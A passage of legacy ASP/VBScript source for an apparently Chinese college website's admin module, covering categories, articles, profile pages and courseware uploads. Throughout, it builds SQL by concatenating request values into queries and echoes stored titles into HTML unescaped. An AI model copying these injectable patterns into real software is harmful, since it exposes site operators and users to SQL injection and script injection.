Select Case Operate
Case "0"
	If OP="del" Then
		DelDate()
	Else
		SortList()
	End If
Case "1"
	AddSort()
Case "2"
	JoinSort()
Case "3"
	If op="del" Then
		DelInfo()
	Else
		ListData()
	End If
Case "4"
	PostData()
Case Else
	SortList()
End Select
End Sub
'
Private Sub JoinSort()
	Maininfo="此功能请等待正式版本"
End Sub
Private Sub ListData()

	Set TaleRS=Conn.ExeCute("Select * From ljy_sort where l_sid="&SID&"")
	If Not TaleRs.Eof Then
		Maininfo=Maininfo&"<Div Style='height:18px'>"
		Do While Not TaleRs.Eof 
		Maininfo=Maininfo&"&nbsp;&nbsp;<a href=admin.asp?action="&SStr&"&operate=3&id="&Talers("l_id")&" Class=list  title='管理此分类'>"&TaleRS("l_title")&"</a>"
		TaleRs.MoveNext
		Loop
	Maininfo=Maininfo&"</Table>"
	Else
		Maininfo="<img src=image/arr.gif>&nbsp;目前还没有分类，请点击右边的菜单进行加入<p>"
	End If
		ShowDate
		Maininfo=TableH&Pwidth&Maininfo&TableF
	Set TaleRS=NoThing
End Sub
Public Sub ShowDate()
Currentpage=Trim(Request("page"))
Maxrecord=Templates.Normal(2)
If Currentpage<>"" then
	If isnumeric(Currentpage)=True then
        		Currentpage=Currentpage
	Else
        		Currentpage=1
	End if
Else
Currentpage=1
End if
	PageUrl="info.asp?action="&SStr&"&operate=2"
	If Did="" Then 
		TaleSQL="Select C.l_id, C.l_time,C.l_title From [ljy_info] C inner join [ljy_sort] S on (S.l_id=C.l_sid and S.l_sid="&SID&") order by C.l_time desc"
	Else
		TaleSQL="Select   l_id,l_time,l_title From [ljy_info] where l_sid="&Did&" order by l_time desc"
	End If
	Set Talers=Server.Createobject("Adodb.recordset")
	Talers.open Talesql,Conn,1,1
	If Not Talers.Eof Then
	Maininfo=Maininfo&"<table cellSpacing=5 cellPadding=0 width=95%  border=0 align=center>"
		Totalrecords=Talers.Recordcount
	If Totalrecords Mod Maxrecord=0 Then
		Npage=Totalrecords\Maxrecord
	Else
		Npage=Totalrecords\Maxrecord+1
	End if
	i=0
	If Currentpage=1 Then
		Call ListPanel
	Else
     		 If (Currentpage-1)*Maxrecord<Totalrecords Then
      			Talers.Move (Currentpage-1)*Maxrecord
      			Call ListPanel
      		Else 
     			Currentpage=1
      			Call ListPanel
		End if
	End if
		Maininfo=Maininfo&"</table>"
		Maininfo=Maininfo&Templates.ListPages("记录",PageUrl,Totalrecords,MaxRecord,Npage,Currentpage)
	Else
		Maininfo=TableH&Pwidth&Maininfo&"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;目前还无记录"&TableF
	End If
	Set TaleRs=Nothing


	End Sub

	Private Sub ListPanel()
	Do While Not Talers.Eof 
	 Maininfo=Maininfo&"<tr><td width=350><img src=image/arr.gif>&nbsp; <a href=show.asp?id="&Talers("l_id")&" target=_blank title='"&Talers("l_title")&"'>"
	If Len(Talers("l_title"))>20 Then
		Maininfo=Maininfo&Left(Talers("l_title"),20)&"..."
	Else
		Maininfo=Maininfo&Talers("l_title")
	End If
	Maininfo=Maininfo&"</a></td><td>["&Year(Talers("l_time"))&"/"&Month(Talers("l_time"))&"/"&Day(Talers("l_time"))&"] </td><td><a href=admin.asp?action="&SStr&"&operate=4&op=edit&id="&TaleRS("l_id")&" class=list title='编辑 ["&TaleRS("l_title")&"]'>编辑</a></td><td><a href=admin.asp?action="&SStr&"&operate=3&op=del&id="&TaleRS("l_id")&" title='删除 ["&TaleRS("l_title")&"]' class=list onclick="&Chr(34)&"return ask('确认要删除\n["&TaleRS("l_title")&"]吗');"&Chr(34)&">删除</a></td></tr>"
	i=i+1
If i>=Maxrecord Then
	Exit Do
End if
Talers.Movenext
Loop
	End Sub
Private Sub SortList()
	Set TaleRS=Conn.ExeCute("Select l_id,l_title From ljy_sort where l_sid="&SID&"")
	If Not TaleRs.Eof Then
		Maininfo=Maininfo&"<Table>"
		Do While Not TaleRs.Eof 
		Maininfo=Maininfo&" <tr><td width=40 align=right><img src=image/arr.gif></td><td width=400>&nbsp;&nbsp;<a href=admin.asp?action="&SStr&"&operate=3&id="&TaleRs("l_id")&" Class=list>"&TaleRS("l_title")&"</a></td><td><a href=admin.asp?action="&SStr&"&operate=1&op=edit&id="&TaleRS("l_id")&" class=list title='编辑 ["&TaleRS("l_title")&"]'>编辑</a></td><td><a href=admin.asp?action="&SStr&"&operate=0&op=del&id="&TaleRS("l_id")&" title='删除 ["&TaleRS("l_title")&"]' class=list onclick="&Chr(34)&"return ask('确认要删除\n["&TaleRS("l_title")&"]吗');"&Chr(34)&">删除</a></td></tr>"
		TaleRs.MoveNext
		Loop
	Maininfo=Maininfo&"</Table>"
	Else
		Maininfo="<img src=image/arr.gif>&nbsp;目前还没有分类，请点击右边的菜单进行加入<p>"
	End If

		Maininfo=TableH&Pwidth&Maininfo&TableF
	Set TaleRS=NoThing
End Sub
Private Sub AddSort
If Request.Form("submit")<>"" Then
Set ReOperate=New TaleStr
ReOperate.StrIn="str0{c}f{c}f{c}f{c}str1{c}f{c}f{c}f"
ReOperate.StrName="分类名称|分类介绍"
ReOperate.RequestStr()
If ReOperate.StrOut(0)="" Or  ReOperate.StrOut(1)="" Then ErrMsg="<li>请把资料填写完整"
If ErrMsg="" Then
	if IsNumeric(DID) And DID<>"" Then 
		Conn.ExeCute("Update ljy_sort set l_title='"&ReOperate.StrOut(0)&"',l_intro='"&ReOperate.StrOut(1)&"',l_time=Now,l_buildman='"&Templates.Adminname&"',l_ip='"&Templates.UserIP&"'  where l_id="&DID&"")
		Maininfo=Maininfo&"编辑成功,请进行其它操作"
	Else
		Conn.Execute("Insert into ljy_sort (l_sid,l_title,l_intro,l_buildman,l_ip) values ("&SID&",'"&ReOperate.StrOut(0)&"','"&ReOperate.StrOut(1)&"','"&Templates.Adminname&"','"&Templates.UserIP&"')")
		Maininfo=Maininfo&"增加成功,请进行其它操作"
	End If
	Maininfo=TableH&Pwidth&"分类<font color=#006600>"&ReOperate.StrOut(0)&"</font>"&Maininfo&"<p>"&TableF
End If
Set ReOperate=Nothing
Else
	Dim Title,Intro
	If Op="edit" Then
		Set TaleRs=Conn.Execute("Select l_title,l_intro from ljy_sort where l_id="&DID&"")
		IF Not Talers.Eof Then
		Title=Talers("l_title")
		Intro=Talers("l_intro")
		Set Talers=NoThing
		End If
	End If
	Templates.Trline=Replace(Templates.Trline,"{tdwidth}","15%")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Dim UAction
	UAction="admin.asp?action="&SStr&"&operate=1"
	If Op="edit" Then UAction=UAction&"&id="&DID
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='"&UAction&"' method=post>分类名称")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str0' value='"&Title&"' class=input2>")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","分类介绍")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;HTML支持<BR>&nbsp;&nbsp;&nbsp;&nbsp;<textarea  name='str1'  class='input2' style='width:80%;height:80'>"&Intro&"</textarea><BR>&nbsp;&nbsp;&nbsp;&nbsp;")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End If
End Sub
'
Private Sub DelDate()
	If DID="" Then ErrMsg="<li>数据ID号不能为空,删除失败"
	'如果有下属内容不能删除

	If ErrMsg="" Then
		Conn.ExeCute("Delete*from ljy_sort where l_id="&DID&"")
		Maininfo=TableH&Pwidth&"删除成功,请进行其它操作"&TableF
	End IF
	Set ReOperate=NoThing
End Sub
'
'
Private Sub DelInfo()
	If DID="" Then ErrMsg="<li>数据ID号不能为空,删除失败"
	If ErrMsg="" Then
		Conn.ExeCute("Delete*from ljy_info where l_id="&DID&"")
		Maininfo=TableH&Pwidth&"删除成功,请进行其它操作"&TableF
	End IF
	Set ReOperate=NoThing
End Sub
'
Private Sub PostData()
If Request.Form("submit")<>"" Then
	Set ReOperate=New TaleStr
	ReOperate.StrIn="str0{c}f{c}f{c}f{c}str1{c}f{c}f{c}f{c}str2{c}f{c}f{c}f{c}str3{c}f{c}t{c}t{c}str4{c}f{c}t{c}t{c}str5{c}f{c}t{c}t"
	ReOperate.StrName="标题|*Tale*|HTML支持|*Tale*|内容|*Tale*|关键字|*Tale*|分类|*Tale*|置顶天数"
	ReOperate.RequestStr()
	ReOperate.LenStr ReOperate.StrOut(0),0,1,30
	ReOperate.LenStr ReOperate.StrOut(2),2,1,50*1024
	ReOperate.StrOut(5)=ReOperate.NumStr(ReOperate.StrOut(5),0,0)
	If ReOperate.StrOut(0)="" Or ReOperate.StrOut(2)="" Or ReOperate.StrOut(3)="" Then ErrMsg=ErrMsg&"<li>资料未填写完全"
	If ReOperate.StrOut(4)="" Then ErrMsg=Errmsg&"<li>请先建立分类"
	ErrMsg=ErrMsg&ReOperate.ErrMsg
	If ErrMsg="" THen
		if IsNumeric(DID) And DID<>"" Then 
		Conn.ExeCute("Update ljy_info set l_sid="&ReOperate.StrOut(4)&",l_title='"&ReOperate.StrOut(0)&"',l_content='"&ReOperate.StrOut(2)&"',l_html="&ReOperate.StrOut(1)&",l_time=Now,l_postman='"&Templates.Adminname&"',l_ip='"&Templates.UserIP&"',l_keyword='"&ReOperate.StrOut(3)&"',l_top="&ReOperate.StrOut(5)&"  where l_id="&DID&"")
		Maininfo=Maininfo&"编辑成功,请进行其它操作"
		Else
		Conn.Execute("Insert into ljy_info (l_sid,l_title,l_content,l_html,l_postman,l_ip,l_keyword,l_top) values ("&ReOperate.StrOut(4)&",'"&ReOperate.StrOut(0)&"','"&ReOperate.StrOut(2)&"',"&ReOperate.StrOut(1)&",'"&Templates.Adminname&"','"&Templates.UserIP&"','"&ReOperate.StrOut(3)&"',"&ReOperate.StrOut(5)&")")
		Maininfo=Maininfo&"发布成功,请进行其它操作"
		End IF
		Maininfo=TableH&Pwidth&ReOperate.StrOut(0)&Maininfo&"<p>"&TableF

	End IF
	Set ReOperate=NoThing
Else
	Dim Title,Html,Content,KeyWord,TopDay,SortID
	If Op="edit" Then
		Set TaleRs=Conn.Execute("Select * from ljy_info where l_id="&DID&"")
		IF Not Talers.Eof Then
		Title=Talers("l_title")
		Content=Talers("l_content")
		Html=Talers("l_html")
		KeyWord=Talers("l_keyword")
		TopDay=Talers("l_top")
		SortID=Talers("l_sid")
		Set Talers=NoThing
		End If
	End If
	Templates.Trline=Replace(Templates.Trline,"{tdwidth}","15%")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Dim UAction
	UAction="admin.asp?action="&SStr&"&operate=4"
	If Op="edit" Then UAction=UAction&"&id="&DID
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='"&Uaction&"' method=post>标题")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str0' value='"&Title&"' class=input2>")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","关键字")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str3' value='"&KeyWord&"' class=input2> (用于查询相关文章,不同关键字用|分开)")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","所属分类")
Dim SSelect
SSelect="<select size=1 name=str4>"
Set TaleRs=Conn.ExeCute("Select l_id,l_title from ljy_sort where l_sid="&SID&"")
If Not TaleRs.Eof  Then
	Do while NOt talers.Eof
		SSelect=SSelect&"<option value='"&Talers("l_id")&"' "
		If Cint(Talers("l_id"))=Cint(SortID) Then SSelect=SSelect&"selected"
		SSelect=SSelect&">"&TaleRs("l_title")&"</option>"
	Talers.MoveNext
	Loop
End If
SSelect=SSelect&"</select>"
Set Talers=NoThing
	Maininfo=Replace(Maininfo,"{rightinfo}",SSelect)
If SID=0 Then
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","置顶天数")
	Maininfo=Replace(Maininfo,"{rightinfo}","<select size=1 name='str5'>"&Templates.NumOption(1,"天",0,30,TopDay,0)&"</select> ( 此功能是将此条新闻在首页置顶放置N天 )")
End If
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","标签支持")
	Dim HtmlIS
	HTMLIS="<input type=radio name='str1' value='1' "
	If Html=True Then  HTMLIS=	HTMLIS&"checked"
	HTMLIS=	HTMLIS&">HTML支持&nbsp;&nbsp;&nbsp;&nbsp;<input type=radio name='str1' value='0'  "
	If Html=False Then 	HTMLIS=	HTMLIS&"checked"
	HTMLIS=	HTMLIS&">UBB支持"
	Maininfo=Replace(Maininfo,"{rightinfo}",HTMLis)
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","UBB标签")
	Set Talers=Conn.ExeCute("Select ubb from ljy_ubbcode")
	If Not Talers.Eof Then
	Maininfo=Replace(Maininfo,"{rightinfo}",Talers("ubb"))
	End If
	Set Talers=NoThing
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","内容")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;<textarea  name='str2'  class='input2' style='width:95%;height:300'>"&Content&"</textarea><BR>&nbsp;&nbsp;&nbsp;&nbsp;")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","上传图片")
	Maininfo=Replace(Maininfo,"{rightinfo}","<iframe marginwidth=0 frameborder=0 width='95%' height=25 src='upform.asp?action=1'></iframe>")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End IF
End Sub
'
End Class
'
Class DataClass
Public AdminMenu,MainInfo,ActionName,Operate,ErrMsg,SID,DID
Private ReOperate,NowDo,Rinfo,Linfo,SStr,OP
Private Sub Class_Initialize()
AdminMenu="资料列表|发布新资料"
MainInfo=""
Set ReOperate=New TaleStr
ReOperate.StrIn="operate{c}s{c}t{c}t{c}op{c}s{c}t{c}t{c}id{c}s{c}t{c}t"
ReOperate.StrName="具体操作|操作|ID号"
ReOperate.RequestStr()
Operate=ReOperate.StrOut(0)
OP=ReOperate.StrOut(1)
DID=ReOperate.StrOut(2)
Operate=ReOperate.NumStr(Operate,0,0)
Set ReOperate=Nothing
End Sub
'
Private Sub Class_Terminate()
End Sub
'
Public Default Sub DoDefault()
Select Case  SID
Case 0
	ActionName="学院介绍"
	SStr="intro"
Case 1
	ActionName="科研活动"
	SStr="edu"
Case 2
	ActionName="教学建设"
	SStr="build"
Case 3
	ActionName="学生管理"
	SStr="stu"
End Select
Select Case Operate
Case "0"
	If OP="del" Then
		DelDate()
	Else
		ListDate()
	End If
Case "1"
	PostDate()
Case Else
	ListDate()
End Select
End Sub
'
Private Sub ListDate()
	Set TaleRS=Conn.ExeCute("Select * From ljy_collegedata where l_sid="&SID&"")
	If Not TaleRs.Eof Then
		j=0
		Maininfo=Maininfo&"<Table>"
		Do While Not TaleRs.Eof 
		Maininfo=Maininfo&" <tr><td width=40 align=right><img src=image/arr.gif></td><td width=400>&nbsp;&nbsp;<a href=intro.asp?action="&SStr&"&operate="&j&" Class=list target=_blank>"&TaleRS("l_title")&"</a></td><td><a href=admin.asp?action="&SStr&"&operate=1&op=edit&id="&TaleRS("l_id")&" class=list title='编辑 ["&TaleRS("l_title")&"]'>编辑</a></td><td><a href=admin.asp?action="&SStr&"&operate=0&op=del&id="&TaleRS("l_id")&" title='删除 ["&TaleRS("l_title")&"]' class=list onclick="&Chr(34)&"return ask('确认要删除\n["&TaleRS("l_title")&"]吗');"&Chr(34)&">删除</a></td></tr>"
		TaleRs.MoveNext
		j=j+1
		Loop
	Maininfo=Maininfo&"</Table>"
	Else
		Maininfo="<img src=image/arr.gif>&nbsp;目前还没有记录，请点击右边的菜单进行加入<p>"
	End If

		Maininfo=TableH&Pwidth&Maininfo&TableF
	Set TaleRS=NoThing
End Sub
'
Private Sub PostDate()
If Request.Form("submit")<>"" Then
	Set ReOperate=New TaleStr
	ReOperate.StrIn="str0{c}f{c}f{c}f{c}str1{c}f{c}t{c}t{c}str2{c}f{c}f{c}f"
	ReOperate.StrName="标题|*Tale*|HTML支持|*Tale*|内容"
	ReOperate.RequestStr()
	ReOperate.LenStr ReOperate.StrOut(0),0,1,30
	ReOperate.LenStr ReOperate.StrOut(2),2,1,50*1024
	If ReOperate.StrOut(0)="" Or ReOperate.StrOut(2)="" Then ErrMsg="<li>资料未填写完全"
	ErrMsg=ErrMsg&ReOperate.ErrMsg
	If ErrMsg="" THen
		if IsNumeric(DID) And DID<>"" Then 
		Conn.ExeCute("Update ljy_collegedata set l_title='"&ReOperate.StrOut(0)&"',l_content='"&ReOperate.StrOut(2)&"',l_html="&ReOperate.StrOut(1)&",l_time=Now,l_postman='"&Templates.Adminname&"',l_ip='"&Templates.UserIP&"'  where l_id="&DID&"")
		Maininfo=Maininfo&"编辑成功,请进行其它操作"
		Else
		Conn.Execute("Insert into ljy_collegedata (l_sid,l_title,l_content,l_html,l_postman,l_ip) values ("&SID&",'"&ReOperate.StrOut(0)&"','"&ReOperate.StrOut(2)&"',"&ReOperate.StrOut(1)&",'"&Templates.Adminname&"','"&Templates.UserIP&"')")
		Maininfo=Maininfo&"发布成功,请进行其它操作"
		End IF
		Maininfo=TableH&Pwidth&ReOperate.StrOut(0)&Maininfo&"<p>"&TableF

	End IF
	Set ReOperate=NoThing
Else
	Dim Title,Html,Content
	If Op="edit" Then
		Set TaleRs=Conn.Execute("Select l_title,l_content,l_html from ljy_collegedata where l_id="&DID&"")
		IF Not Talers.Eof Then
		Title=Talers("l_title")
		Content=Talers("l_content")
		Html=Talers("l_html")
		Set Talers=NoThing
		End If
	End If
	Templates.Trline=Replace(Templates.Trline,"{tdwidth}","15%")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Dim UAction
	UAction="admin.asp?action="&SStr&"&operate=1"
	If Op="edit" Then UAction=UAction&"&id="&DID
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='"&Uaction&"' method=post>资料名称")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str0' value='"&Title&"' class=input2>")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","标签支持")
	Dim HtmlIS
	HTMLIS="<input type=radio name='str1' value='1' "
	If Html=True Then  HTMLIS=	HTMLIS&"checked"
	HTMLIS=	HTMLIS&">HTML支持&nbsp;&nbsp;&nbsp;&nbsp;<input type=radio name='str1' value='0'  "
	If Html=False Then 	HTMLIS=	HTMLIS&"checked"
	HTMLIS=	HTMLIS&">UBB支持"
	Maininfo=Replace(Maininfo,"{rightinfo}",HTMLis)
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","UBB标签")
	Set Talers=Conn.ExeCute("Select ubb from ljy_ubbcode")
	If Not Talers.Eof Then
	Maininfo=Replace(Maininfo,"{rightinfo}",Talers("ubb"))
	End If
	Set Talers=NoThing
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","资料内容")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;<textarea  name='str2'  class='input2' style='width:95%;height:300'>"&Content&"</textarea><BR>&nbsp;&nbsp;&nbsp;&nbsp;")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","上传图片")
	Maininfo=Replace(Maininfo,"{rightinfo}","<iframe marginwidth=0 frameborder=0 width='95%' height=25 src='upform.asp?action=1'></iframe>")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End IF
End Sub
'
Private Sub DelDate()
	If DID="" Then ErrMsg="<li>数据ID号不能为空,删除失败"
	If ErrMsg="" Then
		Conn.ExeCute("Delete*from ljy_collegedata where l_id="&DID&"")
		Maininfo=TableH&Pwidth&"删除成功,请进行其它操作"&TableF
	End IF
	Set ReOperate=NoThing
End Sub
'
End Class
'
Class DownClass
Public AdminMenu,MainInfo,ActionName,Operate,ErrMsg,SID,DID
Private ReOperate,NowDo,Rinfo,Linfo,SStr,OP
Private Sub Class_Initialize()
AdminMenu="发布课件列表|待发布课件|发布新课件"
ActionName="管理首页"
MainInfo=""
Set ReOperate=New TaleStr
ReOperate.StrIn="operate{c}s{c}t{c}t{c}op{c}s{c}t{c}t{c}id{c}s{c}t{c}t"
ReOperate.StrName="具体操作|操作|ID号"
ReOperate.RequestStr()
Operate=ReOperate.StrOut(0)
OP=ReOperate.StrOut(1)
DID=ReOperate.StrOut(2)
Operate=ReOperate.NumStr(Operate,0,0)
Set ReOperate=Nothing
End Sub
'
Private Sub Class_Terminate()
End Sub
'
Public Default Sub DoDefault()
Select Case Operate
Case "0"
		If OP="del" Then
		DelDate()
	Else
		SortList()
	End If
Case "1"
		If OP="pass" Then
		PassDate()
	Else
		ASortList()
	End If
Case "2"
	PostSoft()
Case Else
	BBSIntro()
End Select
End Sub
Public Sub PostSoft()
If Request.Form("submit")<>"" Then
	Set ReOperate=New TaleStr
	ReOperate.StrIn="str0{c}f{c}f{c}f"
	For i=1 to 6
		ReOperate.StrIn=ReOperate.StrIn&"{c}str"&i&"{c}f{c}f{c}f"
	Next
	session("filename")=""
	ReOperate.StrName="课件名称|*Tale*|课件大小|*Tale*|课件地址|*Tale*|你的大名|*Tale*|联系邮箱|*Tale*|是否发布|*Tale*|课件介绍"
	ReOperate.RequestStr()
	ReOperate.LenStr ReOperate.StrOut(0),0,1,30
	ReOperate.StrOut(1)=ReOperate.NumStr(ReOperate.StrOut(1),1,1)
	ReOperate.LenStr ReOperate.StrOut(2),2,1,200
	ReOperate.LenStr ReOperate.StrOut(6),6,1,10*1024
	ReOperate.IsEmail ReOperate.StrOut(4),4
	ReOperate.StrOut(5)=ReOperate.NumStr(ReOperate.StrOut(5),0,0)
	If ReOperate.StrOut(3)=""  Or ReOperate.StrOut(1)="" Or ReOperate.StrOut(6)="" Then ErrMsg="<li>资料未填写完全"
	ErrMsg=ErrMsg&ReOperate.ErrMsg
	If ErrMsg="" THen
		if IsNumeric(DID) And DID<>"" Then 
		If Templates.Adminname="" or Templates.Adminpassword="" or Templates.Adminnum="" Then
				ErrMsg="你没有这个权限"
				Exit Sub
		End IF
		Conn.ExeCute("Update ljy_soft set l_title='"&ReOperate.StrOut(0)&"',l_size="&ReOperate.StrOut(1)&",l_downurl='"&ReOperate.StrOut(2)&"',l_time=Now,l_postman='"&ReOperate.StrOut(3)&"',l_ip='"&Templates.UserIP&"' ,l_email='"&ReOperate.StrOut(4)&"',l_intro= '"&ReOperate.StrOut(6)&"',l_post="&ReOperate.StrOut(5)&"  where l_id="&DID&"")
		Maininfo=Maininfo&"编辑成功,请进行其它操作"
		Else
		Conn.Execute("Insert into ljy_soft (l_title,l_size,l_downurl,l_postman,l_email,l_post,l_intro,l_ip) values ('"&ReOperate.StrOut(0)&"',"&ReOperate.StrOut(1)&",'"&ReOperate.StrOut(2)&"','"&ReOperate.StrOut(3)&"','"&ReOperate.StrOut(4)&"','"&ReOperate.StrOut(5)&"','"&ReOperate.StrOut(6)&"','"&Templates.UserIP&"')")
		If Templates.Adminname="" or Templates.Adminpassword="" or Templates.Adminnum="" Then
			Maininfo=Maininfo&"上传课件成功,请等待管理员审核,谢谢您的支持!"
		Else
		Maininfo=Maininfo&"发布成功,请进行其它操作"
		End If
		End IF
		Maininfo=TableH&Pwidth&ReOperate.StrOut(0)&Maininfo&"<p>"&TableF

	End IF
	Set ReOperate=NoThing
Else
	Dim Title,Size,URL,Name,Email,Intro,HTML
	If Op="edit" Then
		Set TaleRs=Conn.Execute("Select * from ljy_soft where l_id="&DID&"")
		IF Not Talers.Eof Then
		Title=Talers("l_title")
		Size=Talers("l_size")
		URL=Talers("l_downurl")
		Name=Talers("l_postman")
		Email=Talers("l_email")
		Intro=Talers("l_intro")
		Html=Talers("l_post")
		Set Talers=NoThing
		End If
	End If
	Templates.Trline=Replace(Templates.Trline,"{tdwidth}","15%")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Dim UAction
	If Templates.Adminname="" or Templates.Adminpassword="" or Templates.Adminnum="" Then
		Uaction="up.asp"
	Else
		UAction="admin.asp?action=down&operate=2&id="&DID&""
	End If
	Maininfo=Replace(Maininfo,"{leftinfo}","<Form name=TaleForm action='"&Uaction&"' method=post>课件名称")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str0' value='"&Title&"' class=input2>")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","课件大小")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str1' value='"&Size&"' class=input2> ( 单位 KB )")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","课件地址")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str2' value='"&URl&"' class=input2> ( 如果是上传的请勿修改此选项 )")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","你的大名")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str3' value='"&Name&"' class=input2>")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","联系邮箱")
	Maininfo=Replace(Maininfo,"{rightinfo}","<input  name='str4' value='"&Email&"' class=input2>")
	If Templates.Adminname<>"" and Templates.Adminpassword<>"" and Templates.Adminnum<>"" Then
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","是否发布")
	Dim HtmlIS
	HTMLIS="<input type=radio name='str5' value='1' "
	If Html=True Then  HTMLIS=	HTMLIS&"checked"
	HTMLIS=	HTMLIS&">允许发布&nbsp;&nbsp;&nbsp;&nbsp;<input type=radio name='str5' value='0'  "
	If Html=False Then 	HTMLIS=	HTMLIS&"checked"
	HTMLIS=	HTMLIS&">暂不发布"
	Maininfo=Replace(Maininfo,"{rightinfo}",HTMLis)
	End If
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","课件介绍")
	Maininfo=Replace(Maininfo,"{rightinfo}","<BR>&nbsp;&nbsp;&nbsp;&nbsp;<textarea  name='str6'  class='input2' style='width:80%;height:80'>"&Intro&"</textarea><BR>&nbsp;&nbsp;&nbsp;&nbsp;")
	Maininfo=Maininfo&Replace(Templates.Trline,"{bgcolor}","#FFFFFF")
	Maininfo=Replace(Maininfo,"{leftinfo}","上传图片")
	Maininfo=Replace(Maininfo,"{rightinfo}","<iframe marginwidth=0 frameborder=0 width='95%' height=25 src='upform.asp'></iframe>")
	Maininfo=Table1H&Maininfo&"</table>"&TaleLine&"<BR><center>"&Submit&"</Form>"
End IF
End Sub
'
Private Sub SortList()
	Set TaleRS=Conn.ExeCute("Select l_id,l_title From ljy_soft where l_post=true")
	If Not TaleRs.Eof Then
		Maininfo=Maininfo&"<Table>"
		Do While Not TaleRs.Eof 
		Maininfo=Maininfo&" <tr><td width=40 align=right><img src=image/arr.gif></td><td width=400>&nbsp;&nbsp;<a href=# Class=list>"&TaleRS("l_title")&"</a></td><td><a href=admin.asp?action=down&operate=2&op=edit&id="&TaleRS("l_id")&" class=list title='编辑 ["&TaleRS("l_title")&"]'>编辑</a></td><td><a href=admin.asp?action=down&operate=0&op=del&id="&TaleRS("l_id")&" title='删除 ["&TaleRS("l_title")&"]' class=list onclick="&Chr(34)&"return ask('确认要删除\n["&TaleRS("l_title")&"]吗');"&Chr(34)&">删除</a></td></tr>"
		TaleRs.MoveNext
		Loop
	Maininfo=Maininfo&"</Table>"
	Else
		Maininfo="<img src=image/arr.gif>&nbsp;目前还没有课件，请点击右边的菜单进行加入<p>"
	End If

		Maininfo=TableH&Pwidth&Maininfo&TableF
	Set TaleRS=NoThing
End Sub
'
Private Sub ASortList()
	Set TaleRS=Conn.ExeCute("Select l_id,l_title From ljy_soft where l_post=False")
	If Not TaleRs.Eof Then
		Maininfo=Maininfo&"<Table>"
		Do While Not TaleRs.Eof 
